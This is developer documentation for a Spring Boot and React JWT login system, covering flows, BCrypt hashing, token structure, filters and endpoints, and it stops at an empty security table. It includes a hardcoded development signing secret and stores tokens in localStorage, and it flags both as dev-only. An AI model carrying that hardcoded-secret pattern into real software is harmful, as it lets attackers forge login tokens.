# Authentication Feature — Complete Backend Documentation

> This document is written for a developer who needs to both **explain this system confidently in a technical interview** and **continue developing the project**. Every design decision, security concept, and code path is covered in depth.

---

## Table of Contents

1. [Project Overview](#1-project-overview)
2. [Authentication Flow End-to-End](#2-authentication-flow-end-to-end)
3. [Database Design](#3-database-design)
4. [Password Security](#4-password-security)
5. [JWT Deep Dive](#5-jwt-deep-dive)
6. [Authorization System](#6-authorization-system)
7. [Middleware Explanation](#7-middleware-explanation)
8. [API Endpoints](#8-api-endpoints)
9. [Security Considerations](#9-security-considerations)
10. [Error Handling Strategy](#10-error-handling-strategy)
11. [Refresh Token Architecture](#11-refresh-token-architecture)
12. [Interview Questions and Answers](#12-interview-questions-and-answers)
13. [Project Walkthrough for New Developers](#13-project-walkthrough-for-new-developers)
14. [Production Deployment Considerations](#14-production-deployment-considerations)
15. [Future Improvements](#15-future-improvements)
16. [Code Review](#16-code-review)

---

## 1. Project Overview

### 1.1 Purpose

The authentication system provides secure user identity management for a personal Life Management application. It handles:

- **User Registration** — creating new accounts with validated, hashed credentials
- **User Login** — verifying identity and issuing JWT tokens
- **Route Protection** — ensuring only authenticated users access protected resources
- **Stateless Session Management** — no server-side session storage

### 1.2 High-Level Architecture

```
┌─────────────────────────────────────────────────────────────┐
│                     REACT FRONTEND                          │
│  ┌──────────┐  ┌───────────┐  ┌─────────────────────────┐  │
│  │LoginForm │  │SignupForm │  │  useAuth() Hook         │  │
│  │          │  │           │  │  - handleLogin()        │  │
│  └────┬─────┘  └─────┬─────┘  │  - handleSignup()      │  │
│       │              │        │  - isAuthenticated()    │  │
│       ▼              ▼        └─────────────────────────┘  │
│  ┌──────────────────────────┐                               │
│  │   authApi.js (Axios)     │◄── stores token in            │
│  │   POST /api/auth/login   │    localStorage               │
│  │   POST /api/auth/signup  │                               │
│  └────────────┬─────────────┘                               │
└───────────────┼─────────────────────────────────────────────┘
                │  HTTP (via Vite proxy in dev)
                ▼
┌─────────────────────────────────────────────────────────────┐
│                  SPRING BOOT BACKEND                        │
│                                                             │
│  ┌──────────────────────────────────────────────────────┐   │
│  │              Spring Security Filter Chain             │   │
│  │  ┌──────────────┐    ┌───────────────────────────┐   │   │
│  │  │ CORS Filter  │───►│ JwtAuthFilter             │   │   │
│  │  └──────────────┘    │ (OncePerRequestFilter)    │   │   │
│  │                      │ - Extract Bearer token    │   │   │
│  │                      │ - Validate via JwtService │   │   │
│  │                      │ - Set SecurityContext     │   │   │
│  │                      └─────────┬─────────────────┘   │   │
│  │                                │                     │   │
│  │                      ┌─────────▼─────────────────┐   │   │
│  │                      │ Authorization Check        │   │   │
│  │                      │ /api/auth/** → permitAll   │   │   │
│  │                      │ everything else → auth     │   │   │
│  │                      └─────────┬─────────────────┘   │   │
│  └────────────────────────────────┼─────────────────────┘   │
│                                   │                         │
│  ┌────────────────────────────────▼─────────────────────┐   │
│  │              AuthController                           │   │
│  │  POST /api/auth/signup  → AuthService.register()     │   │
│  │  POST /api/auth/login   → AuthService.login()        │   │
│  └────────────────────────────┬─────────────────────────┘   │
│                               │                             │
│  ┌────────────────────────────▼─────────────────────────┐   │
│  │              AuthService                              │   │
│  │  - ConcurrentHashMap<String, User> (in-memory store) │   │
│  │  - BCrypt password hashing via PasswordEncoder       │   │
│  │  - Delegates token creation to JwtService            │   │
│  └────────────────────────────┬─────────────────────────┘   │
│                               │                             │
│  ┌────────────────────────────▼─────────────────────────┐   │
│  │              JwtService                               │   │
│  │  - generateToken(email) → signed JWT string          │   │
│  │  - extractEmail(token) → subject claim               │   │
│  │  - isTokenValid(token) → boolean                     │   │
│  │  - HMAC-SHA256 signing with SecretKey                │   │
│  └──────────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────────┘
```

### 1.3 Why JWT Over Session-Based Authentication

| Criteria | Session-Based | JWT-Based (Our Choice) |
|---|---|---|
| **Server State** | Server stores session in memory/DB | Server stores nothing — token is self-contained |
| **Scalability** | Sticky sessions or shared session store needed | Any server can validate the token independently |
| **Mobile Clients** | Cookies are awkward on mobile | Bearer tokens work identically on all platforms |
| **Microservices** | Session must be shared across services | Each service validates the token independently |
| **Performance** | DB/cache lookup per request | Cryptographic verification only — no I/O |
| **CSRF Vulnerability** | Vulnerable (cookies sent automatically) | Not vulnerable (token sent explicitly in header) |

**Our rationale:** This is a personal Life OS with a React SPA frontend and a Spring Boot REST API. The backend is stateless by design (per `ARCHITECTURE.md`), and we plan to add mobile clients later. JWT is the natural fit — no session store, no sticky sessions, and the same token works for web, mobile, and future microservice extraction.

### 1.4 Key Technologies

| Technology | Version | Purpose |
|---|---|---|
| Spring Boot | 4.1.0 | Application framework |
| Spring Security | (via starter) | Authentication and authorization framework |
| JJWT | 0.12.5 | JWT creation, signing, parsing, and validation |
| BCrypt | (via Spring Security) | Password hashing |
| Lombok | (via starter) | Boilerplate reduction (`@Data`, `@Builder`, etc.) |
| Jakarta Validation | (via starter) | Request body validation (`@NotBlank`, `@Email`, `@Size`) |
| Java | 21 | Language runtime |
| React | 19.2.6 | Frontend SPA |
| Axios | 1.18.0 | HTTP client for API calls |
| Vite | 8.0.12 | Frontend build tool with dev proxy |

---

## 2. Authentication Flow End-to-End

### 2.1 Registration Flow

```
┌────────┐         ┌──────────┐         ┌──────────────┐         ┌───────────┐
│  User  │         │ Frontend │         │AuthController│         │AuthService│
└───┬────┘         └────┬─────┘         └──────┬───────┘         └─────┬─────┘
    │  Fill signup form │                      │                       │
    │─────────────────►│                       │                       │
    │                  │  POST /api/auth/signup │                       │
    │                  │  {name,email,password} │                       │
    │                  │──────────────────────►│                        │
    │                  │                       │  @Valid validation     │
    │                  │                       │  (name, email, size)   │
    │                  │                       │                        │
    │                  │                       │  register(request)     │
    │                  │                       │───────────────────────►│
    │                  │                       │                        │
    │                  │                       │       ┌────────────────┤
    │                  │                       │       │ 1. Check email │
    │                  │                       │       │    uniqueness  │
    │                  │                       │       │ 2. BCrypt hash │
    │                  │                       │       │    password    │
    │                  │                       │       │ 3. Build User  │
    │                  │                       │       │    object      │
    │                  │                       │       │ 4. Store in    │
    │                  │                       │       │    userStore   │
    │                  │                       │       └────────────────┤
    │                  │                       │                        │
    │                  │                       │◄───────────────────────│
    │                  │  201 Created          │  AuthResponse          │
    │                  │  {message: "User      │  {message: "..."}      │
    │                  │   registered           │                       │
    │                  │   successfully"}      │                        │
    │                  │◄──────────────────────│                        │
    │  Navigate to     │                       │                        │
    │  /login          │                       │                        │
    │◄─────────────────│                       │                        │
```

**Step-by-step:**

1. User fills in name, email, and password in `SignupForm.jsx`
2. `handleSubmit()` calls `useAuth().handleSignup(name, email, password)`
3. `handleSignup()` calls `authApi.signupUser({name, email, password})`
4. Axios sends `POST /api/auth/signup` with JSON body
5. Vite proxy forwards request to `http://localhost:8080`
6. Spring Security permits `/api/auth/**` without authentication (per `SecurityConfig`)
7. `AuthController.register()` receives the request, `@Valid` triggers Jakarta validation
8. `AuthService.register()` checks email uniqueness, hashes password with BCrypt, stores user
9. Returns `201 Created` with `{"message": "User registered successfully"}`
10. Frontend navigates to `/login`

### 2.2 Login Flow

```
┌────────┐         ┌──────────┐         ┌──────────────┐         ┌───────────┐       ┌──────────┐
│  User  │         │ Frontend │         │AuthController│         │AuthService│       │JwtService│
└───┬────┘         └────┬─────┘         └──────┬───────┘         └─────┬─────┘       └────┬─────┘
    │  Fill login form  │                      │                       │                   │
    │─────────────────►│                       │                       │                   │
    │                  │  POST /api/auth/login  │                       │                   │
    │                  │  {email, password}     │                       │                   │
    │                  │──────────────────────►│                        │                   │
    │                  │                       │  login(request)        │                   │
    │                  │                       │──────────────────────►│                    │
    │                  │                       │                       │                    │
    │                  │                       │       ┌───────────────┤                    │
    │                  │                       │       │ 1. Find user  │                    │
    │                  │                       │       │    by email   │                    │
    │                  │                       │       │ 2. BCrypt     │                    │
    │                  │                       │       │    .matches() │                    │
    │                  │                       │       └───────────────┤                    │
    │                  │                       │                       │                    │
    │                  │                       │                       │ generateToken()    │
    │                  │                       │                       │───────────────────►│
    │                  │                       │                       │                    │
    │                  │                       │                       │   ┌────────────────┤
    │                  │                       │                       │   │ Build JWT:     │
    │                  │                       │                       │   │ sub=email      │
    │                  │                       │                       │   │ iat=now        │
    │                  │                       │                       │   │ exp=now+24h    │
    │                  │                       │                       │   │ sign(HS256)    │
    │                  │                       │                       │   └────────────────┤
    │                  │                       │                       │                    │
    │                  │                       │                       │◄───────────────────│
    │                  │                       │◄──────────────────────│  JWT string        │
    │                  │  200 OK               │                       │                    │
    │                  │  {token:"eyJ...",      │                       │                    │
    │                  │   message:"Login       │                       │                    │
    │                  │   successful"}         │                       │                    │
    │                  │◄──────────────────────│                        │                    │
    │                  │                       │                        │                    │
    │                  │  localStorage          │                       │                    │
    │                  │  .setItem("token",     │                       │                    │
    │                  │   "eyJ...")            │                       │                    │
    │                  │                       │                        │                    │
    │  Navigate to     │                       │                        │                    │
    │  /home           │                       │                        │                    │
    │◄─────────────────│                       │                        │                    │
```

**Step-by-step:**

1. User fills email and password in `LoginForm.jsx`
2. `handleSubmit()` calls `useAuth().handleLogin(email, password)`
3. `handleLogin()` calls `authApi.loginUser({email, password})`
4. Axios sends `POST /api/auth/login` with JSON body
5. `AuthController.login()` delegates to `AuthService.login()`
6. `AuthService` looks up the user by email in the in-memory `ConcurrentHashMap`
7. `passwordEncoder.matches(rawPassword, hashedPassword)` verifies the credential
8. On success, `jwtService.generateToken(email)` creates a signed JWT
9. Returns `200 OK` with `{"token": "eyJ...", "message": "Login successful"}`
10. Frontend stores the token in `localStorage.setItem("token", token)`
11. Frontend navigates to `/home`

### 2.3 Protected Route Access Flow

```
┌────────┐         ┌──────────┐         ┌─────────────┐         ┌──────────┐
│  User  │         │ Frontend │         │JwtAuthFilter│         │Controller│
└───┬────┘         └────┬─────┘         └──────┬──────┘         └────┬─────┘
    │  Navigate to     │                       │                     │
    │  /home           │                       │                     │
    │─────────────────►│                       │                     │
    │                  │                       │                     │
    │                  │  ProtectedRoute        │                     │
    │                  │  checks localStorage  │                     │
    │                  │  isAuthenticated()     │                     │
    │                  │  → token exists? Yes   │                     │
    │                  │                       │                     │
    │                  │  GET /api/some-resource│                     │
    │                  │  Authorization:        │                     │
    │                  │  Bearer eyJ...         │                     │
    │                  │─────────────────────►│                      │
    │                  │                       │                     │
    │                  │              ┌────────┤                      │
    │                  │              │ 1. Extract "Bearer " token   │
    │                  │              │ 2. jwtService.isTokenValid() │
    │                  │              │ 3. jwtService.extractEmail() │
    │                  │              │ 4. Create Authentication     │
    │                  │              │ 5. Set SecurityContext        │
    │                  │              └────────┤                      │
    │                  │                       │                      │
    │                  │                       │  Request proceeds    │
    │                  │                       │─────────────────────►│
    │                  │                       │                      │
    │                  │  200 OK               │                      │
    │                  │◄──────────────────────┼──────────────────────│
    │  Render page     │                       │                      │
    │◄─────────────────│                       │                      │
```

### 2.4 Logout Flow

```
Frontend only — no server call needed:
1. useAuth().handleLogout() calls localStorage.removeItem("token")
2. ProtectedRoute re-evaluates isAuthenticated() → false
3. React Router navigates to /login via <Navigate to="/login" />
```

Because JWTs are stateless, the server has no session to invalidate. The token simply stops being sent. The token remains technically valid until it expires, but since no client sends it, this is acceptable for our current implementation. (See Section 11 for token blacklisting in production.)

---

## 3. Database Design

### 3.1 Current Implementation — In-Memory Store

Currently, we use a `ConcurrentHashMap<String, User>` in `AuthService` instead of a real database. This is a deliberate development-phase decision that lets us build and test the full JWT flow without database dependencies.

```java
private final Map<String, User> userStore = new ConcurrentHashMap<>();
```

**Why ConcurrentHashMap:** Thread-safe for concurrent read/write operations from multiple HTTP request threads, without requiring explicit synchronization.

### 3.2 User Model (Current — POJO)

```java
@Data
@Builder
@NoArgsConstructor
@AllArgsConstructor
public class User {
    private UUID id;          // Primary key — universally unique
    private String name;      // Display name
    private String email;     // Login identifier — must be unique
    private String password;  // BCrypt hash — NEVER the plaintext
    private Role role;        // USER or ADMIN
    private LocalDateTime createdAt;  // Account creation timestamp
}
```

**Field-by-field analysis:**

| Field | Type | Purpose | Validation | Security Implication |
|---|---|---|---|---|
| `id` | `UUID` | Primary key, prevents sequential ID enumeration | Auto-generated | UUIDs are unguessable — attackers can't iterate user IDs |
| `name` | `String` | Display name for UI greeting | `@NotBlank` | No sensitive data, but sanitize for XSS on output |
| `email` | `String` | Unique login identifier, map key | `@NotBlank`, `@Email` | Used as JWT subject — leaked tokens reveal email |
| `password` | `String` | BCrypt hash of user's password | `@NotBlank`, `@Size(min=6)` | NEVER serialized in API responses — DTOs prevent this |
| `role` | `Role` | Authorization level | Defaults to `USER` | Stored in token claims if RBAC is expanded |
| `createdAt` | `LocalDateTime` | Audit trail | Auto-set at registration | Useful for rate limiting and suspicious activity detection |

### 3.3 Role Enum

```java
public enum Role {
    USER,
    ADMIN
}
```

**Design decision:** Using an enum (not a separate table) because:
- Roles are a closed, rarely-changing set
- No need for dynamic role creation at runtime
- Enum is type-safe at compile time
- When we connect PostgreSQL, this maps to a `VARCHAR` column or a PostgreSQL `ENUM` type

### 3.4 Future PostgreSQL Schema (When Database Is Connected)

```sql
CREATE TABLE users (
    id          UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    name        VARCHAR(100) NOT NULL,
    email       VARCHAR(255) UNIQUE NOT NULL,
    password    VARCHAR(255) NOT NULL,       -- BCrypt hash is always 60 chars
    role        VARCHAR(20) NOT NULL DEFAULT 'USER',
    created_at  TIMESTAMP NOT NULL DEFAULT NOW()
);

CREATE INDEX idx_users_email ON users(email);  -- Fast lookup for login
```

**Migration path:** When connecting PostgreSQL:
1. Add `@Entity` and `@Table` annotations to `User.java`
2. Convert `UserRepository` from empty stub to `JpaRepository<User, UUID>`
3. Replace `ConcurrentHashMap` operations in `AuthService` with repository calls
4. Remove the `spring.autoconfigure.exclude` line from `application.properties`

### 3.5 Refresh Token Storage (Future)

```sql
CREATE TABLE refresh_tokens (
    id          UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    token       VARCHAR(512) NOT NULL UNIQUE,
    user_id     UUID NOT NULL REFERENCES users(id) ON DELETE CASCADE,
    expires_at  TIMESTAMP NOT NULL,
    revoked     BOOLEAN NOT NULL DEFAULT FALSE,
    created_at  TIMESTAMP NOT NULL DEFAULT NOW()
);

CREATE INDEX idx_refresh_tokens_token ON refresh_tokens(token);
CREATE INDEX idx_refresh_tokens_user  ON refresh_tokens(user_id);
```

### 3.6 Indexing and Performance

| Index | Column | Query It Optimizes | Why |
|---|---|---|---|
| `PRIMARY KEY` | `id` | Direct user lookup | Clustered index, auto-created |
| `UNIQUE` | `email` | Login lookup, duplicate check | Most frequent query path — every login hits this |
| `idx_refresh_tokens_token` | `token` | Token validation | Every protected request validates the refresh token |
| `idx_refresh_tokens_user` | `user_id` | Logout (revoke all tokens for user) | Bulk revocation on password change |

---

## 4. Password Security

### 4.1 BCrypt — Our Hashing Algorithm

**What is BCrypt?**

BCrypt is an **adaptive hash function** based on the Blowfish cipher. "Adaptive" means its computational cost can be increased over time as hardware gets faster, ensuring it remains resistant to brute-force attacks.

**How it works:**

```
Input: "password123"
        │
        ▼
┌──────────────────┐
│  Generate Salt   │ ← 16 random bytes, different every time
│  $2a$10$...      │
└────────┬─────────┘
         │
         ▼
┌──────────────────┐
│  Hash Function   │ ← Blowfish-based, 2^10 (1024) iterations
│  (cost factor=10)│
└────────┬─────────┘
         │
         ▼
Output: "$2a$10$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZdL17lhWy"
         ├──┤├┤├────────────────────────┤├──────────────────────────────┤
         algo cost        salt (22 chars)          hash (31 chars)
```

**Key properties:**
- **Salt is embedded in the hash** — no separate salt column needed
- **Same password → different hash every time** — because the salt is random
- **Cost factor (work factor)** — `10` means 2^10 = 1024 iterations. Increase to 12 or 14 for production
- **Output is always 60 characters** — fits in `VARCHAR(255)` comfortably

### 4.2 Our Implementation

**Registration — hashing:**

```java
// In AuthService.register()
.password(passwordEncoder.encode(request.getPassword()))
```

`passwordEncoder` is a `BCryptPasswordEncoder` bean defined in `SecurityConfig`:

```java
@Bean
public PasswordEncoder passwordEncoder() {
    return new BCryptPasswordEncoder();
}
```

**Login — verification:**

```java
// In AuthService.login()
if (user == null || !passwordEncoder.matches(request.getPassword(), user.getPassword())) {
    throw new InvalidCredentialsException("Invalid email or password");
}
```

`matches()` extracts the salt from the stored hash, re-hashes the input password with that salt, and compares the results. This is a **constant-time comparison** — it takes the same amount of time whether the mismatch is in the first or last byte, preventing timing attacks.

### 4.3 Why Plaintext Passwords Must Never Be Stored

1. **Database breaches happen** — if passwords are plaintext, every user account is instantly compromised
2. **Users reuse passwords** — a breach of your app compromises their bank, email, and social accounts
3. **Legal liability** — GDPR, PCI-DSS, and most regulations require hashing
4. **Insider threats** — even database admins should not be able to read passwords
5. **BCrypt is one-way** — even with the hash AND the salt, recovering the original password requires brute-force at 2^10 iterations per guess

### 4.4 Security Best Practices

| Practice | Our Status | Notes |
|---|---|---|
| Hash with BCrypt/Argon2 | Done | BCrypt with default cost factor 10 |
| Unique salt per password | Done | BCrypt auto-generates |
| Constant-time comparison | Done | `BCryptPasswordEncoder.matches()` handles this |
| Minimum password length | Done | `@Size(min = 6)` validation |
| Never log passwords | Done | DTOs prevent password from appearing in responses |
| Never return password in API | Done | `AuthResponse` DTO has no password field |
| Password reset flow | Not yet | See Future Improvements |

### 4.5 Password Reset Flow (Future Implementation)

```
1. User requests reset → POST /api/auth/forgot-password {email}
2. Server generates a time-limited reset token (separate from JWT)
3. Server sends email with reset link containing token
4. User clicks link → frontend sends POST /api/auth/reset-password {token, newPassword}
5. Server validates token, hashes new password, updates user
6. Server revokes all existing refresh tokens for that user
7. User must log in again with new password
```

---

## 5. JWT Deep Dive

### 5.1 JWT Structure

A JWT is three Base64URL-encoded JSON objects separated by dots:

```
eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ0ZXN0QGV4YW1wbGUuY29tIiwiaWF0IjoxNzE5MDAwMDAwLCJleHAiOjE3MTkwODY0MDB9.signature_here

└────── HEADER ──────┘ └──────────────────── PAYLOAD ─────────────────────┘ └─ SIGNATURE ─┘
```

### 5.2 Header

```json
{
  "alg": "HS256"
}
```

| Field | Value | Meaning |
|---|---|---|
| `alg` | `HS256` | HMAC using SHA-256 — symmetric key algorithm |

**Why HS256?**
- Simple: one shared secret key for both signing and verification
- Fast: HMAC is computationally cheap
- Sufficient for a monolith where the same server signs and verifies
- For microservices, you'd use RS256 (asymmetric) so services can verify without knowing the signing key

### 5.3 Payload (Claims)

```json
{
  "sub": "test@example.com",
  "iat": 1719000000,
  "exp": 1719086400
}
```

| Claim | Full Name | Value | Purpose |
|---|---|---|---|
| `sub` | Subject | `"test@example.com"` | Identifies the user this token belongs to |
| `iat` | Issued At | `1719000000` | Unix timestamp — when the token was created |
| `exp` | Expiration | `1719086400` | Unix timestamp — when the token becomes invalid (24h later) |

**How these are set in our code:**

```java
return Jwts.builder()
        .subject(email)           // sets "sub" claim
        .issuedAt(now)            // sets "iat" claim
        .expiration(expiry)       // sets "exp" claim — now + 86400000ms (24h)
        .signWith(signingKey)     // HMAC-SHA256 signature
        .compact();               // encodes to Base64URL string
```

**Important:** The payload is Base64URL-encoded, NOT encrypted. Anyone can decode and read the claims. Never put sensitive data (passwords, SSNs, credit cards) in the payload.

### 5.4 Signature

```
HMAC-SHA256(
  base64UrlEncode(header) + "." + base64UrlEncode(payload),
  secretKey
)
```

The signature guarantees **integrity** (the token hasn't been tampered with) and **authenticity** (it was issued by our server). If anyone modifies a single character in the header or payload, the signature won't match and `Jwts.parser().verifyWith(signingKey)` will throw a `JwtException`.

### 5.5 Example JWT from Our System

**Decoded token issued for `test@example.com`:**

```
Header:
{
  "alg": "HS256"
}

Payload:
{
  "sub": "test@example.com",
  "iat": 1719000000,
  "exp": 1719086400
}

Signature:
HMAC-SHA256(
  "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ0ZXN0QGV4YW1wbGUuY29tIiwiaWF0IjoxNzE5MDAwMDAwLCJleHAiOjE3MTkwODY0MDB9",
  "MyHardcodedSuperSecretKeyForDevelopmentOnly2024ThatIsLongEnoughForHS256"
)
```

### 5.6 Access Token vs Refresh Token

| Property | Access Token (Current) | Refresh Token (Future) |
|---|---|---|
| **Purpose** | Authenticate API requests | Obtain new access tokens |
| **Lifetime** | Short (15 min in production, 24h in dev) | Long (7-30 days) |
| **Storage (client)** | localStorage or memory | httpOnly cookie (more secure) |
| **Sent with** | Every API request in `Authorization` header | Only to `/api/auth/refresh` endpoint |
| **Contains** | User identity claims | Opaque or minimal claims |
| **Revocable** | No (stateless) | Yes (stored in database) |
| **If stolen** | Attacker has access for token lifetime | Attacker can generate new access tokens |

**Current state:** We only use access tokens with a 24h expiry. This is a development convenience. See Section 11 for the refresh token architecture plan.

### 5.7 Token Expiration Strategy

```
jwt.expiration=86400000  ← 24 hours in milliseconds
```

**Why 24 hours for development:**
- Convenient — don't need to re-login constantly during development
- Long enough to test the full flow without token refresh

**Production recommendation:**
- Access token: 15 minutes
- Refresh token: 7 days
- Shorter access tokens limit the damage window if a token is stolen

**How expiration is enforced:**

```java
// JwtService — token validation automatically checks expiration
private Claims extractAllClaims(String token) {
    return Jwts.parser()
            .verifyWith(signingKey)   // verifies signature
            .build()
            .parseSignedClaims(token) // ← throws ExpiredJwtException if exp < now
            .getPayload();
}
```

JJWT automatically throws `ExpiredJwtException` (a subclass of `JwtException`) when `exp` is in the past. Our `isTokenValid()` catches this and returns `false`.

### 5.8 Secret Key Management

**Current (development):**

```properties
jwt.secret=MyHardcodedSuperSecretKeyForDevelopmentOnly2024ThatIsLongEnoughForHS256
```

**How the key is used:**

```java
this.signingKey = Keys.hmacShaKeyFor(secret.getBytes());
```

`Keys.hmacShaKeyFor()` creates a `SecretKey` object from the raw bytes. For HS256, the key must be at least 256 bits (32 bytes). Our 70-character string exceeds this requirement.

**Production requirements:**
- Store in environment variable: `JWT_SECRET=...`
- Use `@Value("${JWT_SECRET}")` or Spring Cloud Config
- Generate with: `openssl rand -base64 64`
- Rotate periodically (see Section 14)
- Never commit to version control

---

## 6. Authorization System

### 6.1 Authentication vs Authorization

| Concept | Question It Answers | Our Implementation |
|---|---|---|
| **Authentication** | "Who are you?" | JWT token validates identity |
| **Authorization** | "What can you do?" | Role-based rules determine access |

**Authentication** happens in `JwtAuthFilter` — it verifies the token and identifies the user.
**Authorization** happens in `SecurityConfig` — it defines which endpoints require which roles.

### 6.2 Role-Based Access Control (RBAC)

Our `Role` enum defines two roles:

```java
public enum Role {
    USER,   // Standard user — can manage their own data
    ADMIN   // Administrator — can manage all users and system settings
}
```

**How roles are assigned:**

```java
// In AuthService.register() — all new users get USER role
.role(Role.USER)
```

**How roles flow through the system:**

```
Registration → User.role = Role.USER
                    │
                    ▼
CustomUserDetailsService.loadUserByUsername()
    → new SimpleGrantedAuthority("ROLE_" + user.getRole().name())
    → "ROLE_USER"
                    │
                    ▼
JwtAuthFilter sets authentication with authority
    → List.of(new SimpleGrantedAuthority("ROLE_USER"))
                    │
                    ▼
SecurityConfig authorization rules
    → .requestMatchers("/api/auth/**").permitAll()
    → .anyRequest().authenticated()
    → Future: .requestMatchers("/api/admin/**").hasRole("ADMIN")
```

### 6.3 Current Authorization Rules

```java
.authorizeHttpRequests(auth -> auth
    .requestMatchers("/api/auth/**").permitAll()   // Login/signup — no token needed
    .anyRequest().authenticated()                   // Everything else — valid token required
)
```

### 6.4 Extending with Fine-Grained Permissions (How-To)

To add role-based endpoint protection:

```java
// In SecurityConfig:
.authorizeHttpRequests(auth -> auth
    .requestMatchers("/api/auth/**").permitAll()
    .requestMatchers("/api/admin/**").hasRole("ADMIN")
    .requestMatchers("/api/grocery/**").hasAnyRole("USER", "ADMIN")
    .anyRequest().authenticated()
)
```

Or at the controller level with method security:

```java
@PreAuthorize("hasRole('ADMIN')")
@GetMapping("/api/admin/users")
public List<User> getAllUsers() { ... }
```

---

## 7. Middleware Explanation

In Spring Security, "middleware" is implemented as **Filters** — components in the servlet filter chain that intercept every HTTP request before it reaches the controller.

### 7.1 JwtAuthFilter (JWT Verification Middleware)

**File:** `features/auth/security/JwtAuthFilter.java`

```
Input:  HTTP request with potential "Authorization: Bearer <token>" header
Output: SecurityContext populated with authenticated user OR unchanged request
```

**Processing logic:**

```
Request arrives
    │
    ▼
shouldNotFilter() → path starts with /api/auth/ ?
    │ Yes → SKIP filter, continue chain
    │ No  ▼
    │
Extract Authorization header
    │
    ▼
Header present and starts with "Bearer " ?
    │ No  → continue chain (no auth set → will fail at authorization check)
    │ Yes ▼
    │
Extract token (substring after "Bearer ")
    │
    ▼
jwtService.isTokenValid(token) ?
    │ No  → continue chain (invalid token → will fail at authorization check)
    │ Yes ▼
    │
Extract email from token
    │
    ▼
SecurityContext already has authentication?
    │ Yes → skip (idempotent — don't overwrite)
    │ No  ▼
    │
Create UsernamePasswordAuthenticationToken
    │ - principal = email
    │ - credentials = null
    │ - authorities = [ROLE_USER]
    │
Set on SecurityContextHolder
    │
    ▼
Continue filter chain → request proceeds to controller
```

**Failure cases:**
- Missing header → request proceeds unauthenticated → 401 from `JwtAuthEntryPoint`
- Malformed token → `isTokenValid()` returns false → same outcome
- Expired token → `extractAllClaims()` throws `ExpiredJwtException` → caught by `isTokenValid()` → false
- Tampered token → signature mismatch → `SignatureException` → caught → false

### 7.2 JwtAuthEntryPoint (Error Handling Middleware)

**File:** `features/auth/security/JwtAuthEntryPoint.java`

```
Input:  Unauthenticated request that hit a protected endpoint
Output: 401 JSON response
```

**When it fires:** Spring Security calls `commence()` when a request fails the authorization check (no valid authentication in `SecurityContext` but the endpoint requires it).

**Response format:**

```json
{
  "error": "Unauthorized",
  "message": "Full authentication is required to access this resource"
}
```

**Why it exists:** Without it, Spring Security defaults to redirecting to a login page — appropriate for server-rendered HTML apps, but wrong for REST APIs. Our entry point returns a clean JSON error that the React frontend can handle.

### 7.3 SecurityConfig (Configuration, Not Middleware)

**File:** `features/auth/security/SecurityConfig.java`

This is not a filter itself but **configures the entire filter chain**:

```java
http
    .cors(...)           // 1. CORS filter — allows cross-origin requests from frontend
    .csrf(...)           // 2. CSRF filter — disabled (stateless, no cookies)
    .exceptionHandling() // 3. Exception handling — JwtAuthEntryPoint for 401s
    .sessionManagement() // 4. Session policy — STATELESS (no HttpSession created)
    .authorizeHttpRequests() // 5. Authorization rules — which paths need auth
    .addFilterBefore()   // 6. Register JwtAuthFilter before UsernamePasswordAuthFilter
```

### 7.4 Request Validation (Jakarta Validation)

Not a traditional "middleware" but acts as one — validation annotations on DTOs are evaluated by Spring when `@Valid` is present on the controller parameter:

```java
public ResponseEntity<AuthResponse> register(@Valid @RequestBody RegisterRequest request)
```

**Validation rules:**

```java
@NotBlank(message = "Name is required")      // Rejects null, empty, and whitespace-only
private String name;

@NotBlank(message = "Email is required")
@Email(message = "Invalid email format")      // Must match email regex pattern
private String email;

@NotBlank(message = "Password is required")
@Size(min = 6, message = "Password must be at least 6 characters")
private String password;
```

**Failure case:** If validation fails, Spring returns `400 Bad Request` with field-level error details before the controller method is even called.

---

## 8. API Endpoints

### 8.1 POST /api/auth/signup — User Registration

**Route:** `/api/auth/signup`
**HTTP Method:** `POST`
**Authentication Required:** No (`permitAll`)

**Request Body:**

```json
{
  "name": "Priya Sharma",
  "email": "priya@example.com",
  "password": "securePass123"
}
```

**Validation Rules:**

| Field | Rules | Error Message |
|---|---|---|
| `name` | Not blank | "Name is required" |
| `email` | Not blank, valid email format | "Email is required" / "Invalid email format" |
| `password` | Not blank, min 6 characters | "Password is required" / "Password must be at least 6 characters" |

**Success Response — 201 Created:**

```json
{
  "token": null,
  "message": "User registered successfully"
}
```

**Error Response — 409 Conflict (duplicate email):**

```json
{
  "token": null,
  "message": "Email already registered"
}
```

**Error Response — 400 Bad Request (validation failure):**

```json
{
  "timestamp": "2024-06-22T...",
  "status": 400,
  "errors": [
    "Password must be at least 6 characters",
    "Invalid email format"
  ]
}
```

**Security Considerations:**
- Password is hashed with BCrypt before storage — never stored as plaintext
- Response does NOT include the password hash or the user object
- Email uniqueness is enforced — prevents duplicate accounts
- No token is returned on signup — user must explicitly log in (prevents auto-login with unverified email in future)

### 8.2 POST /api/auth/login — User Login

**Route:** `/api/auth/login`
**HTTP Method:** `POST`
**Authentication Required:** No (`permitAll`)

**Request Body:**

```json
{
  "email": "test@example.com",
  "password": "password123"
}
```

**Success Response — 200 OK:**

```json
{
  "token": "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ0ZXN0QGV4YW1wbGUuY29tIiwiaWF0IjoxNzE5MDAwMDAwLCJleHAiOjE3MTkwODY0MDB9.abc123signature",
  "message": "Login successful"
}
```

**Error Response — 401 Unauthorized:**

```json
{
  "token": null,
  "message": "Invalid email or password"
}
```

**Security Considerations:**
- Generic error message ("Invalid email or password") — doesn't reveal whether the email exists or the password is wrong. This prevents **user enumeration attacks**
- BCrypt comparison is constant-time — prevents **timing attacks**
- No rate limiting yet — should be added before production (see Section 9)

### 8.3 Future Endpoints (Not Yet Implemented)

| Endpoint | Method | Purpose | Status |
|---|---|---|---|
| `/api/auth/refresh` | POST | Exchange refresh token for new access token | Planned |
| `/api/auth/logout` | POST | Revoke refresh token server-side | Planned |
| `/api/auth/me` | GET | Get authenticated user profile | Planned |
| `/api/auth/change-password` | PUT | Change password (requires current password) | Planned |
| `/api/auth/forgot-password` | POST | Initiate password reset email | Planned |
| `/api/auth/reset-password` | POST | Complete password reset with token | Planned |

---

## 9. Security Considerations

### 9.1 Comprehensive Security Matrix

| Threat | Mitigation | Our Status | Implementation |
|---|---|---|---|
